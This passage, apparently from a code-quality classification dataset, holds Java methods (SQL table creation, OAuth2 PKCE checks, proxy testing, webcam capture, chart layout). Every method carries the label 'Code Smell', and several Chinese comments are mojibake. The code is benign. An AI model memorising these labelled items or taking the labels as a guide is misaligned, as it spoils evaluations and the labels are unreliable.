 * 鐢熸垚鍒涘缓琛⊿QL
 * @param model 妯″瀷
 * @return sql
 */
private String genCreateTableSql(GenTableAndColumnModel model){
  String tableName=model.getTableName();
  List<GenTableColumnModel> columnList=model.getColumnList();
  StringBuilder str=new StringBuilder();
  str.append(""CREATE TABLE `"").append(SQLFilterKit.replaceSQL(tableName)).append(""`"").append("" ("");
  for (int i=0; i < columnList.size(); i++) {
    GenTableColumnModel tmp=columnList.get(i);
    str.append(""`"").append(SQLFilterKit.replaceSQL(tmp.getFieldName())).append(""`"");
    String fieldType=SQLFilterKit.replaceSQL(tmp.getFieldType());
    FieldTypeAttribute fieldAttr=MySqlSyncColumnType.INSTANCE.getAttr(fieldType);
    str.append("" "").append(fieldType);
    if (fieldAttr != null) {
      if (fieldAttr.isIzLength()) {
        Integer len=tmp.getFieldLength();
        str.append(""("");
        if (fieldAttr.isIzPrecision()) {
          str.append(len + tmp.getFieldPrecision()).append("","").append(tmp.getFieldPrecision());
        }
 else {
          str.append(len);
        }
        str.append("")"");
      }
    }
    if (DictType.NO_YES_YES.getValue().equals(tmp.getIzPk())) {
      str.append("" "").append(""PRIMARY KEY"");
    }
 else {
      if (DictType.NO_YES_YES.getValue().equals(tmp.getIzNotNull())) {
        str.append("" "").append(""NOT NULL"");
      }
    }
    if (StringUtils.isNotEmpty(tmp.getFieldComments())) {
      str.append("" "").append(""COMMENT '"").append(SQLFilterKit.replaceSQL(tmp.getFieldComments())).append(""'"");
    }
    if (i != columnList.size() - 1) {
      str.append("","");
    }
  }
  str.append("" )"");
  str.append("" ENGINE="").append(ENGINE);
  str.append("" DEFAULT"");
  str.append("" CHARSET="").append(CHARSET);
  str.append("" COLLATE="").append(COLLATE);
  str.append("" COMMENT='"").append(SQLFilterKit.replaceSQL(model.getComments())).append(""'"");
  str.append("";"");
  return str.toString();
}",1,Code Smell
"private static Text getPrefix(){
  if (customPrefixes.isEmpty()) {
    forcedPrefixClassName=null;
    return PREFIX;
  }
  boolean foundChatUtils=false;
  String className=null;
  if (forcedPrefixClassName != null) {
    className=forcedPrefixClassName;
    forcedPrefixClassName=null;
  }
 else {
    for (    StackTraceElement element : Thread.currentThread().getStackTrace()) {
      if (foundChatUtils) {
        if (!element.getClassName().equals(ChatUtils.class.getName())) {
          className=element.getClassName();
          break;
        }
      }
 else {
        if (element.getClassName().equals(ChatUtils.class.getName()))         foundChatUtils=true;
      }
    }
  }
  if (className == null)   return PREFIX;
  for (  Pair<String,Supplier<Text>> pair : customPrefixes) {
    if (className.startsWith(pair.getLeft())) {
      Text prefix=pair.getRight().get();
      return prefix != null ? prefix : PREFIX;
    }
  }
  return PREFIX;
}
",1,Code Smell
"private static Set<String> generateMethodsOf(Class<?> clazz,Set<String> methodPool,Map<String,String> genericTypes,ConstructionOption[] options){
  Set<String> methods=new HashSet<String>();
  Set<String> thisLevelMethodPool=new HashSet<String>();
  for (  Method m : clazz.getDeclaredMethods()) {
    StringBuilder methodSignatureBuilder=new StringBuilder(m.getName());
    for (    Type p : m.getGenericParameterTypes()) {
      methodSignatureBuilder.append(""#"").append(getParameterName(p,genericTypes));
    }
    String methodSignature=methodSignatureBuilder.toString();
    if (methodPool.contains(methodSignature)) {
      continue;
    }
    thisLevelMethodPool.add(methodSignature);
    if (Modifier.isAbstract(m.getModifiers())) {
      StringBuilder sourceCode=new StringBuilder();
      sourceCode.append(""\tpublic "").append(getTypeParameters(m.getTypeParameters(),true,genericTypes)).append(getClassName(m.getGenericReturnType(),genericTypes)).append("" "").append(m.getName()).append(""("");
      Type[] parameters=m.getGenericParameterTypes();
      for (int i=0; i < parameters.length; i++) {
        sourceCode.append(getParameterName(parameters[i],genericTypes)).append("" p"").append(i);
        if (i < parameters.length - 1) {
          sourceCode.append("", "");
        }
      }
      sourceCode.append("") {\n"");
      String returnType=getClassName(m.getGenericReturnType(),genericTypes);
      if (!""void"".equals(returnType)) {
        sourceCode.append(""\t\treturn "").append(getDefaultValue(returnType,getClassName(m.getReturnType()),CollectionUtil.contains(options,EXCEPT_RETURN_VALUE),genericTypes)).append("";\n"");
      }
      sourceCode.append(""\t}\n"");
      methods.add(sourceCode.toString());
    }
  }
  methodPool.addAll(thisLevelMethodPool);
  List<Type> superTypes=new ArrayList<Type>(Arrays.asList(clazz.getGenericInterfaces()));
  if (clazz.getGenericSuperclass() != null) {
    superTypes.add(clazz.getGenericSuperclass());
  }
  for (  Type t : superTypes) {
    if (t instanceof ParameterizedType) {
      ParameterizedType pt=(ParameterizedType)t;
      methods.addAll(generateMethodsOf((Class<?>)pt.getRawType(),methodPool,parseGenericTypes(pt),options));
    }
 else     if (t instanceof Class) {
      methods.addAll(generateMethodsOf((Class<?>)t,methodPool,Collections.<String,String>emptyMap(),options));
    }
  }
  return methods;
}",1,Code Smell
"public static boolean checkDeviceHasNavigationBar(Context context){
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
    ViewGroup vp=(ViewGroup)OldMainActivity.CURRENT_ACTIVITY.get().getWindow().getDecorView();
    if (vp != null) {
      for (int i=0; i < vp.getChildCount(); i++) {
        vp.getChildAt(i).getContext().getPackageName();
        if (vp.getChildAt(i).getId() != -1 && ""navigationBarBackground"".equals(OldMainActivity.CURRENT_ACTIVITY.get().getResources().getResourceEntryName(vp.getChildAt(i).getId()))) {
          return true;
        }
      }
    }
    return false;
  }
 else {
    boolean hasNavigationBar=false;
    Resources rs=context.getResources();
    int id=rs.getIdentifier(""config_showNavigationBar"",""bool"",""android"");
    if (id > 0) {
      hasNavigationBar=rs.getBoolean(id);
    }
    try {
      Class systemPropertiesClass=Class.forName(""android.os.SystemProperties"");
      Method m=systemPropertiesClass.getMethod(""get"",String.class);
      String navBarOverride=(String)m.invoke(systemPropertiesClass,""qemu.hw.mainkeys"");
      if (""1"".equals(navBarOverride)) {
        hasNavigationBar=false;
      }
 else       if (""0"".equals(navBarOverride)) {
        hasNavigationBar=true;
      }
    }
 catch (    Exception e) {
      return false;
    }
    return hasNavigationBar;
  }
}",1,Code Smell
"private void calcOffset(int width){
  if (layout == null) {
    return;
  }
  if (layout.getLineCount() > 0) {
    textWidth=(int)Math.ceil(layout.getLineWidth(0));
    if (fullLayout != null) {
      textHeight=fullLayout.getLineBottom(fullLayout.getLineCount() - 1);
    }
 else     if (maxLines > 1 && layout.getLineCount() > 0) {
      textHeight=layout.getLineBottom(layout.getLineCount() - 1);
    }
 else {
      textHeight=layout.getLineBottom(0);
    }
    if ((gravity & Gravity.HORIZONTAL_GRAVITY_MASK) == Gravity.CENTER_HORIZONTAL) {
      offsetX=(width - textWidth) / 2 - (int)layout.getLineLeft(0);
    }
 else     if ((gravity & Gravity.HORIZONTAL_GRAVITY_MASK) == Gravity.LEFT) {
      if (firstLineLayout != null) {
        offsetX=-(int)firstLineLayout.getLineLeft(0);
      }
 else {
        offsetX=-(int)layout.getLineLeft(0);
      }
    }
 else     if (layout.getLineLeft(0) == 0) {
      if (firstLineLayout != null) {
        offsetX=(int)(width - firstLineLayout.getLineWidth(0));
      }
 else {
        offsetX=width - textWidth;
      }
    }
 else {
      offsetX=-AndroidUtilities.dp(8);
    }
    offsetX+=getPaddingLeft();
    int rightDrawableWidth=0;
    if (rightDrawableInside) {
      if (rightDrawable != null && !rightDrawableOutside) {
        rightDrawableWidth+=(int)(rightDrawable.getIntrinsicWidth() * rightDrawableScale);
      }
      if (rightDrawable2 != null && !rightDrawableOutside) {
        rightDrawableWidth+=(int)(rightDrawable2.getIntrinsicWidth() * rightDrawableScale);
      }
    }
    textDoesNotFit=textWidth + rightDrawableWidth > (width - paddingRight);
    if (fullLayout != null && fullLayoutAdditionalWidth > 0) {
      fullLayoutLeftCharactersOffset=fullLayout.getPrimaryHorizontal(0) - firstLineLayout.getPrimaryHorizontal(0);
    }
  }
  if (replacingDrawableTextIndex >= 0) {
    replacingDrawableTextOffset=layout.getPrimaryHorizontal(replacingDrawableTextIndex);
  }
 else {
    replacingDrawableTextOffset=0;
  }
}",1,Code Smell
"@Override public void run(){
  int finalMiniCapPort=PortTool.getPort();
  AndroidDeviceBridgeTool.forward(iDevice,finalMiniCapPort,""minicap"");
  Socket capSocket=null;
  InputStream inputStream=null;
  try {
    capSocket=new Socket(""localhost"",finalMiniCapPort);
    inputStream=capSocket.getInputStream();
    int len=1024;
    while (miniCapPro.isAlive()) {
      byte[] buffer=new byte[len];
      int realLen;
      realLen=inputStream.read(buffer);
      if (buffer.length != realLen && realLen >= 0) {
        buffer=subByteArray(buffer,0,realLen);
      }
      if (realLen >= 0) {
        dataQueue.offer(buffer);
      }
    }
  }
 catch (  IOException e) {
    e.printStackTrace();
  }
 finally {
    if (miniCapPro.isAlive()) {
      miniCapPro.interrupt();
      log.info(""miniCap thread closed."");
    }
    if (capSocket != null && capSocket.isConnected()) {
      try {
        capSocket.close();
        log.info(""miniCap socket closed."");
      }
 catch (      IOException e) {
        e.printStackTrace();
      }
    }
    if (inputStream != null) {
      try {
        inputStream.close();
        log.info(""miniCap input stream closed."");
      }
 catch (      IOException e) {
        e.printStackTrace();
      }
    }
  }
  AndroidDeviceBridgeTool.removeForward(iDevice,finalMiniCapPort,""minicap"");
  if (session != null) {
    ScreenMap.getMap().remove(session);
  }
}",1,Code Smell
"@SuppressWarnings(""DataFlowIssue"") @Override public Xml.Tag visitTag(Xml.Tag tag,ExecutionContext ctx){
  if (isDependenciesTag()) {
    getCursor().putMessage(""dependencies"",new HashMap<DependencyKey,Xml.Tag>());
  }
 else   if (isManagedDependenciesTag()) {
    getCursor().putMessage(""managedDependencies"",new HashMap<DependencyKey,Xml.Tag>());
  }
 else   if (isDependencyTag()) {
    Map<DependencyKey,Xml.Tag> dependencies=getCursor().getNearestMessage(""dependencies"");
    DependencyKey dependencyKey=getDependencyKey(tag);
    if (dependencyKey != null) {
      Xml.Tag existing=dependencies.putIfAbsent(dependencyKey,tag);
      if (existing != null && existing != tag) {
        maybeUpdateModel();
        return null;
      }
    }
  }
 else   if (isManagedDependencyTag()) {
    Map<DependencyKey,Xml.Tag> dependencies=getCursor().getNearestMessage(""managedDependencies"");
    DependencyKey dependencyKey=getManagedDependencyKey(tag);
    if (dependencyKey != null) {
      Xml.Tag existing=dependencies.putIfAbsent(dependencyKey,tag);
      if (existing != null && existing != tag) {
        maybeUpdateModel();
        return null;
      }
    }
  }
  return super.visitTag(tag,ctx);
}
",1,Code Smell
"protected void setupBuiltinCategories(){
  var categoriesDir=getCategoriesDir();
  var allConnections=getStoreCategoryIfPresent(ALL_CONNECTIONS_CATEGORY_UUID);
  if (allConnections.isEmpty()) {
    var cat=DataStoreCategory.createNew(null,ALL_CONNECTIONS_CATEGORY_UUID,""All connections"");
    cat.setDirectory(categoriesDir.resolve(ALL_CONNECTIONS_CATEGORY_UUID.toString()));
    storeCategories.add(cat);
  }
 else {
    allConnections.get().setParentCategory(null);
  }
  var allScripts=getStoreCategoryIfPresent(ALL_SCRIPTS_CATEGORY_UUID);
  if (allScripts.isEmpty()) {
    var cat=DataStoreCategory.createNew(null,ALL_SCRIPTS_CATEGORY_UUID,""All scripts"");
    cat.setDirectory(categoriesDir.resolve(ALL_SCRIPTS_CATEGORY_UUID.toString()));
    storeCategories.add(cat);
  }
 else {
    allScripts.get().setParentCategory(null);
  }
  if (getStoreCategoryIfPresent(PREDEFINED_SCRIPTS_CATEGORY_UUID).isEmpty()) {
    var cat=DataStoreCategory.createNew(ALL_SCRIPTS_CATEGORY_UUID,PREDEFINED_SCRIPTS_CATEGORY_UUID,""Predefined"");
    cat.setDirectory(categoriesDir.resolve(PREDEFINED_SCRIPTS_CATEGORY_UUID.toString()));
    storeCategories.add(cat);
  }
  if (getStoreCategoryIfPresent(CUSTOM_SCRIPTS_CATEGORY_UUID).isEmpty()) {
    var cat=DataStoreCategory.createNew(ALL_SCRIPTS_CATEGORY_UUID,CUSTOM_SCRIPTS_CATEGORY_UUID,""Custom"");
    cat.setDirectory(categoriesDir.resolve(CUSTOM_SCRIPTS_CATEGORY_UUID.toString()));
    storeCategories.add(cat);
  }
  if (getStoreCategoryIfPresent(DEFAULT_CATEGORY_UUID).isEmpty()) {
    storeCategories.add(new DataStoreCategory(categoriesDir.resolve(DEFAULT_CATEGORY_UUID.toString()),DEFAULT_CATEGORY_UUID,""Default"",Instant.now(),Instant.now(),true,ALL_CONNECTIONS_CATEGORY_UUID,StoreSortMode.ALPHABETICAL_ASC,false));
  }
  storeCategories.forEach(dataStoreCategory -> {
    if (dataStoreCategory.getParentCategory() != null && getStoreCategoryIfPresent(dataStoreCategory.getParentCategory()).isEmpty()) {
      dataStoreCategory.setParentCategory(ALL_CONNECTIONS_CATEGORY_UUID);
    }
 else     if (dataStoreCategory.getParentCategory() == null && !dataStoreCategory.getUuid().equals(ALL_CONNECTIONS_CATEGORY_UUID) && !dataStoreCategory.getUuid().equals(ALL_SCRIPTS_CATEGORY_UUID)) {
      dataStoreCategory.setParentCategory(ALL_CONNECTIONS_CATEGORY_UUID);
    }
  }
);
}
",1,Code Smell
"public List<List<String>> accountsMerge(List<List<String>> accounts){
  Map<String,String> emailToName=new HashMap();
  Map<String,ArrayList<String>> graph=new HashMap();
  for (  List<String> account : accounts) {
    String name="""";
    for (    String email : account) {
      if (name == """") {
        name=email;
        continue;
      }
      graph.computeIfAbsent(email,x -> new ArrayList<String>()).add(account.get(1));
      graph.computeIfAbsent(account.get(1),x -> new ArrayList<String>()).add(email);
      emailToName.put(email,name);
    }
  }
  Set<String> seen=new HashSet();
  List<List<String>> ans=new ArrayList();
  for (  String email : graph.keySet()) {
    if (!seen.contains(email)) {
      seen.add(email);
      Stack<String> stack=new Stack();
      stack.push(email);
      List<String> component=new ArrayList();
      while (!stack.empty()) {
        String node=stack.pop();
        component.add(node);
        for (        String nei : graph.get(node)) {
          if (!seen.contains(nei)) {
            seen.add(nei);
            stack.push(nei);
          }
        }
      }
      Collections.sort(component);
      component.add(0,emailToName.get(email));
      ans.add(component);
    }
  }
  return ans;
}",1,Code Smell
"public ChartHorizontalLinesData(long newMaxHeight,long newMinHeight,boolean useMinHeight,float k,int formatter,TextPaint firstTextPaint,TextPaint secondTextPaint){
  if (!useMinHeight) {
    long v=newMaxHeight;
    if (newMaxHeight > 100) {
      v=round(newMaxHeight);
    }
    int step=Math.max(1,(int)Math.ceil(v / 5.0));
    int n;
    if (v < 6) {
      n=(int)Math.max(2,v + 1);
    }
 else     if (v / 2 < 6) {
      n=(int)(v / 2 + 1);
      if (v % 2 != 0) {
        n++;
      }
    }
 else {
      n=6;
    }
    values=new long[n];
    valuesStr=new CharSequence[n];
    layouts=new StaticLayout[n];
    if (k > 0) {
      valuesStr2=new CharSequence[n];
      layouts2=new StaticLayout[n];
    }
    boolean skipFloatValues=step / k < 1;
    for (int i=1; i < n; i++) {
      values[i]=i * step;
      valuesStr[i]=format(0,firstTextPaint,values[i],formatter);
      if (k > 0) {
        float v2=(values[i] / k);
        if (skipFloatValues) {
          if (v2 - ((int)v2) < 0.01f || formatter == ChartData.FORMATTER_TON) {
            valuesStr2[i]=format(1,secondTextPaint,(long)v2,formatter);
          }
 else {
            valuesStr2[i]="""";
          }
        }
 else {
          valuesStr2[i]=format(1,secondTextPaint,(long)v2,formatter);
        }
      }
    }
  }
 else {
    int n;
    long dif=newMaxHeight - newMinHeight;
    float step;
    if (dif == 0) {
      newMinHeight--;
      n=3;
      step=1f;
    }
 else     if (dif < 6) {
      n=(int)Math.max(2,dif + 1);
      step=1f;
    }
 else     if (dif / 2 < 6) {
      n=(int)(dif / 2 + dif % 2 + 1);
      step=2f;
    }
 else {
      step=(newMaxHeight - newMinHeight) / 5f;
      if (step <= 0) {
        step=1;
        n=(int)(Math.max(2,newMaxHeight - newMinHeight + 1));
      }
 else {
        n=6;
      }
    }
    values=new long[n];
    valuesStr=new CharSequence[n];
    layouts=new StaticLayout[n];
    if (k > 0) {
      valuesStr2=new CharSequence[n];
      layouts2=new StaticLayout[n];
    }
    boolean skipFloatValues=step / k < 1;
    for (int i=0; i < n; i++) {
      values[i]=newMinHeight + (int)(i * step);
      valuesStr[i]=format(0,firstTextPaint,newMinHeight + (long)(i * step),formatter);
      if (k > 0) {
        float v=(values[i] / k);
        if (skipFloatValues) {
          if (v - ((int)v) < 0.01f || formatter == ChartData.FORMATTER_TON) {
            valuesStr2[i]=format(1,secondTextPaint,(long)v,formatter);
          }
 else {
            valuesStr2[i]="""";
          }
        }
 else {
          valuesStr2[i]=format(1,secondTextPaint,(long)v,formatter);
        }
      }
    }
  }
}",1,Code Smell
"private boolean authenticate(OAuth2ClientAuthenticationToken clientAuthentication,RegisteredClient registeredClient){
  Map<String,Object> parameters=clientAuthentication.getAdditionalParameters();
  if (!authorizationCodeGrant(parameters)) {
    return false;
  }
  OAuth2Authorization authorization=this.authorizationService.findByToken((String)parameters.get(OAuth2ParameterNames.CODE),AUTHORIZATION_CODE_TOKEN_TYPE);
  if (authorization == null) {
    throwInvalidGrant(OAuth2ParameterNames.CODE);
  }
  if (this.logger.isTraceEnabled()) {
    this.logger.trace(""Retrieved authorization with authorization code"");
  }
  OAuth2AuthorizationRequest authorizationRequest=authorization.getAttribute(OAuth2AuthorizationRequest.class.getName());
  String codeChallenge=(String)authorizationRequest.getAdditionalParameters().get(PkceParameterNames.CODE_CHALLENGE);
  String codeVerifier=(String)parameters.get(PkceParameterNames.CODE_VERIFIER);
  if (!StringUtils.hasText(codeChallenge)) {
    if (registeredClient.getClientSettings().isRequireProofKey() || StringUtils.hasText(codeVerifier)) {
      if (this.logger.isDebugEnabled()) {
        this.logger.debug(LogMessage.format(""Invalid request: code_challenge is required"" + "" for registered client '%s'"",registeredClient.getId()));
      }
      throwInvalidGrant(PkceParameterNames.CODE_CHALLENGE);
    }
 else {
      if (this.logger.isTraceEnabled()) {
        this.logger.trace(""Did not authenticate code verifier since requireProofKey=false"");
      }
      return false;
    }
  }
  if (this.logger.isTraceEnabled()) {
    this.logger.trace(""Validated code verifier parameters"");
  }
  String codeChallengeMethod=(String)authorizationRequest.getAdditionalParameters().get(PkceParameterNames.CODE_CHALLENGE_METHOD);
  if (!codeVerifierValid(codeVerifier,codeChallenge,codeChallengeMethod)) {
    if (this.logger.isDebugEnabled()) {
      this.logger.debug(LogMessage.format(""Invalid request: code_verifier is missing or invalid"" + "" for registered client '%s'"",registeredClient.getId()));
    }
    throwInvalidGrant(PkceParameterNames.CODE_VERIFIER);
  }
  if (this.logger.isTraceEnabled()) {
    this.logger.trace(""Authenticated code verifier"");
  }
  return true;
}",1,Code Smell
"private static void handleFromItems(PlainSelect plainSelect,String dsType) throws Exception {
  FromItem fromItem=plainSelect.getFromItem();
  if (fromItem instanceof ParenthesedSelect) {
    if (((ParenthesedSelect)fromItem).getSelect() instanceof SetOperationList) {
      StringBuilder result=new StringBuilder();
      SetOperationList setOperationList=(SetOperationList)((ParenthesedSelect)fromItem).getSelect().getSelectBody();
      for (int i=0; i < setOperationList.getSelects().size(); i++) {
        result.append(handlePlainSelect((PlainSelect)setOperationList.getSelects().get(i),null,dsType));
        if (i < setOperationList.getSelects().size() - 1) {
          result.append("" "").append(setOperationList.getOperations().get(i).toString()).append("" "");
        }
      }
    }
 else {
      PlainSelect selectBody=((ParenthesedSelect)fromItem).getSelect().getPlainSelect();
      Select subSelectTmp=(Select)CCJSqlParserUtil.parse(removeVariables(selectBody.toString(),dsType));
      ((ParenthesedSelect)fromItem).setSelect(subSelectTmp.getSelectBody());
      if (dsType.equals(DatasourceConfiguration.DatasourceType.oracle.getType())) {
        if (fromItem.getAlias() != null) {
          fromItem.setAlias(new Alias(fromItem.getAlias().toString(),false));
        }
      }
 else {
        if (fromItem.getAlias() == null) {
          throw new Exception(""Failed to parse sql, Every derived table must have its own alias锛�"");
        }
        fromItem.setAlias(new Alias(fromItem.getAlias().toString(),false));
      }
    }
    plainSelect.setFromItem(fromItem);
  }
}",1,Code Smell
"public void checkSingleProxy(SharedConfig.ProxyInfo proxyInfo,int repeat,Runnable callback){
  if (SharedConfig.activeAccounts.isEmpty() && proxyInfo instanceof SharedConfig.WsProxy) {
    proxyInfo.availableCheckTime=SystemClock.elapsedRealtime();
    proxyInfo.checking=false;
    proxyInfo.available=false;
    proxyInfo.ping=0;
    callback.run();
    return;
  }
  UIUtil.runOnIoDispatcher(() -> {
    if (proxyInfo instanceof SharedConfig.ExternalSocks5Proxy && !((SharedConfig.ExternalSocks5Proxy)proxyInfo).isStarted()) {
      try {
        ((SharedConfig.ExternalSocks5Proxy)proxyInfo).start();
      }
 catch (      Exception e) {
        FileLog.e(e);
        AlertUtil.showToast(e);
      }
      ThreadUtil.sleep(233L);
    }
    proxyInfo.proxyCheckPingId=ConnectionsManager.getInstance(currentAccount).checkProxy(proxyInfo.address,proxyInfo.port,proxyInfo.username,proxyInfo.password,proxyInfo.secret,time -> AndroidUtilities.runOnUIThread(() -> {
      if (time == -1) {
        if (repeat > 0) {
          checkSingleProxy(proxyInfo,repeat - 1,callback);
        }
 else {
          proxyInfo.availableCheckTime=SystemClock.elapsedRealtime();
          proxyInfo.checking=false;
          proxyInfo.available=false;
          proxyInfo.ping=0;
          if (proxyInfo instanceof SharedConfig.ExternalSocks5Proxy && proxyInfo != SharedConfig.currentProxy) {
            ((SharedConfig.ExternalSocks5Proxy)proxyInfo).stop();
          }
          if (callback != null) {
            UIUtil.runOnUIThread(callback);
          }
        }
      }
 else {
        proxyInfo.availableCheckTime=SystemClock.elapsedRealtime();
        proxyInfo.checking=false;
        proxyInfo.ping=time;
        proxyInfo.available=true;
        if (proxyInfo instanceof SharedConfig.ExternalSocks5Proxy && proxyInfo != SharedConfig.currentProxy) {
          ((SharedConfig.ExternalSocks5Proxy)proxyInfo).stop();
        }
        if (callback != null) {
          UIUtil.runOnUIThread(callback);
        }
      }
    }
));
  }
);
}",1,Code Smell
"@Override public Task<Image> createTask(){
  return new Task<Image>(){
    @Override protected Image call() throws Exception {
      try {
        if (cam == null) {
          List<Webcam> webcams=Webcam.getWebcams(1,TimeUnit.MINUTES);
          if (webcams.isEmpty()) {
            throw new UnsupportedOperationException(""No camera available."");
          }
          cam=webcams.get(0);
          if (device != null) {
            for (            Webcam webcam : webcams) {
              if (webcam.getDevice().getName().equals(device.getName())) {
                cam=webcam;
              }
            }
          }
 else           if (Config.get().getWebcamDevice() != null) {
            for (            Webcam webcam : webcams) {
              if (webcam.getDevice().getName().equals(Config.get().getWebcamDevice())) {
                cam=webcam;
              }
            }
          }
          device=cam.getDevice();
          cam.setCustomViewSizes(resolution.getSize());
          cam.setViewSize(resolution.getSize());
          if (!Arrays.asList(cam.getWebcamListeners()).contains(listener)) {
            cam.addWebcamListener(listener);
          }
          opening.set(true);
          cam.open(true,delayCalculator);
          opening.set(false);
        }
        BufferedImage originalImage=cam.getImage();
        if (originalImage == null) {
          return null;
        }
        CroppedDimension cropped=getCroppedDimension(originalImage);
        BufferedImage croppedImage=originalImage.getSubimage(cropped.x,cropped.y,cropped.length,cropped.length);
        BufferedImage framedImage=getFramedImage(originalImage,cropped);
        Image image=SwingFXUtils.toFXImage(framedImage,null);
        updateValue(image);
        if (System.currentTimeMillis() > (lastQrSampleTime + QR_SAMPLE_PERIOD_MILLIS)) {
          readQR(originalImage,croppedImage);
          lastQrSampleTime=System.currentTimeMillis();
        }
        return image;
      }
  finally {
        opening.set(false);
      }
    }
  }
;
}",1,Code Smell
"@PostMapping(""/update"") @ApiOperation(""鏇存柊鎵ц鍣�"") public ReturnT<String> update(@RequestBody JobGroup jobGroup){
  if (jobGroup.getAppName() == null || jobGroup.getAppName().trim().length() == 0) {
    return new ReturnT<String>(500,(I18nUtil.getString(""system_please_input"") + ""AppName""));
  }
  if (jobGroup.getAppName().length() < 4 || jobGroup.getAppName().length() > 64) {
    return new ReturnT<String>(500,I18nUtil.getString(""jobgroup_field_appName_length""));
  }
  if (jobGroup.getTitle() == null || jobGroup.getTitle().trim().length() == 0) {
    return new ReturnT<String>(500,(I18nUtil.getString(""system_please_input"") + I18nUtil.getString(""jobgroup_field_title"")));
  }
  if (jobGroup.getAddressType() == 0) {
    List<String> registryList=findRegistryByAppName(jobGroup.getAppName());
    String addressListStr=null;
    if (registryList != null && !registryList.isEmpty()) {
      Collections.sort(registryList);
      addressListStr="""";
      for (      String item : registryList) {
        addressListStr+=item + "","";
      }
      addressListStr=addressListStr.substring(0,addressListStr.length() - 1);
    }
    jobGroup.setAddressList(addressListStr);
  }
 else {
    if (jobGroup.getAddressList() == null || jobGroup.getAddressList().trim().length() == 0) {
      return new ReturnT<String>(500,I18nUtil.getString(""jobgroup_field_addressType_limit""));
    }
    String[] addresses=jobGroup.getAddressList().split("","");
    for (    String item : addresses) {
      if (item == null || item.trim().length() == 0) {
        return new ReturnT<String>(500,I18nUtil.getString(""jobgroup_field_registryList_invalid""));
      }
    }
  }
  int ret=jobGroupMapper.update(jobGroup);
  return (ret > 0) ? ReturnT.SUCCESS : ReturnT.FAIL;
}",1,Code Smell
"public static <J2 extends J>List<JRightPadded<J2>> withElements(List<JRightPadded<J2>> before,List<J2> elements){
  if (elements.size() == before.size()) {
    boolean hasChanges=false;
    for (int i=0; i < before.size(); i++) {
      if (before.get(i).getElement() != elements.get(i)) {
        hasChanges=true;
        break;
      }
    }
    if (!hasChanges) {
      return before;
    }
  }
 else   if (elements.isEmpty()) {
    return Collections.emptyList();
  }
  List<JRightPadded<J2>> after=new ArrayList<>(elements.size());
  Map<UUID,JRightPadded<J2>> beforeById=new HashMap<>((int)Math.ceil(elements.size() / 0.75));
  for (  JRightPadded<J2> j : before) {
    if (beforeById.put(j.getElement().getId(),j) != null) {
      throw new IllegalStateException(""Duplicate key"");
    }
  }
  for (  J2 t : elements) {
    JRightPadded<J2> found;
    if ((found=beforeById.get(t.getId())) != null) {
      after.add(found.withElement(t));
    }
 else {
      after.add(new JRightPadded<>(t,Space.EMPTY,Markers.EMPTY));
    }
  }
  return after;
}",1,Code Smell
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  OpenAiChatOptions other=(OpenAiChatOptions)obj;
  if (this.model == null) {
    if (other.model != null)     return false;
  }
 else   if (!model.equals(other.model))   return false;
  if (this.frequencyPenalty == null) {
    if (other.frequencyPenalty != null)     return false;
  }
 else   if (!this.frequencyPenalty.equals(other.frequencyPenalty))   return false;
  if (this.logitBias == null) {
    if (other.logitBias != null)     return false;
  }
 else   if (!this.logitBias.equals(other.logitBias))   return false;
  if (this.logprobs == null) {
    if (other.logprobs != null)     return false;
  }
 else   if (!this.logprobs.equals(other.logprobs))   return false;
  if (this.topLogprobs == null) {
    if (other.topLogprobs != null)     return false;
  }
 else   if (!this.topLogprobs.equals(other.topLogprobs))   return false;
  if (this.maxTokens == null) {
    if (other.maxTokens != null)     return false;
  }
 else   if (!this.maxTokens.equals(other.maxTokens))   return false;
  if (this.n == null) {
    if (other.n != null)     return false;
  }
 else   if (!this.n.equals(other.n))   return false;
  if (this.presencePenalty == null) {
    if (other.presencePenalty != null)     return false;
  }
 else   if (!this.presencePenalty.equals(other.presencePenalty))   return false;
  if (this.responseFormat == null) {
    if (other.responseFormat != null)     return false;
  }
 else   if (!this.responseFormat.equals(other.responseFormat))   return false;
  if (this.seed == null) {
    if (other.seed != null)     return false;
  }
 else   if (!this.seed.equals(other.seed))   return false;
  if (this.stop == null) {
    if (other.stop != null)     return false;
  }
 else   if (!stop.equals(other.stop))   return false;
  if (this.temperature == null) {
    if (other.temperature != null)     return false;
  }
 else   if (!this.temperature.equals(other.temperature))   return false;
  if (this.topP == null) {
    if (other.topP != null)     return false;
  }
 else   if (!topP.equals(other.topP))   return false;
  if (this.tools == null) {
    if (other.tools != null)     return false;
  }
 else   if (!tools.equals(other.tools))   return false;
  if (this.toolChoice == null) {
    if (other.toolChoice != null)     return false;
  }
 else   if (!toolChoice.equals(other.toolChoice))   return false;
  if (this.user == null) {
    if (other.user != null)     return false;
  }
 else   if (!this.user.equals(other.user))   return false;
  return true;
}
",1,Code Smell
"/** 
 * 鍒楄〃鎸囧畾鍖呬腑鐨勬墍鏈夌被
 * @param packageName 鍖呭悕绉�
 * @param recursive   鏄惁閫掑綊鏌ユ壘?
 * @param filter      杩囨护鍣�
 * @return 绗﹀悎鏉′欢鐨勭被闆嗗悎
 */
static public Set<Class<?>> listClazz(String packageName,boolean recursive,IClazzFilter filter){
  if (packageName == null || packageName.isEmpty()) {
    return null;
  }
  final String packagePath=packageName.replace('.','/');
  ClassLoader cl=Thread.currentThread().getContextClassLoader();
  Set<Class<?>> resultSet=new HashSet<>();
  try {
    Enumeration<URL> urlEnum=cl.getResources(packagePath);
    while (urlEnum.hasMoreElements()) {
      URL currUrl=urlEnum.nextElement();
      final String protocol=currUrl.getProtocol();
      Set<Class<?>> tmpSet=null;
      if (""FILE"".equalsIgnoreCase(protocol)) {
        tmpSet=listClazzFromDir(new File(currUrl.getFile()),packageName,recursive,filter);
      }
 else       if (""JAR"".equalsIgnoreCase(protocol)) {
        String fileStr=currUrl.getFile();
        if (fileStr.startsWith(""file:"")) {
          fileStr=fileStr.substring(5);
        }
        if (fileStr.lastIndexOf('!') > 0) {
          fileStr=fileStr.substring(0,fileStr.lastIndexOf('!'));
        }
        tmpSet=listClazzFromJar(new File(fileStr),packageName,recursive,filter);
      }
      if (tmpSet != null) {
        resultSet.addAll(tmpSet);
      }
    }
  }
 catch (  Exception ex) {
    throw new RuntimeException(ex);
  }
  return resultSet;
}",1,Code Smell
"private void updateReactionLayoutPosition(){
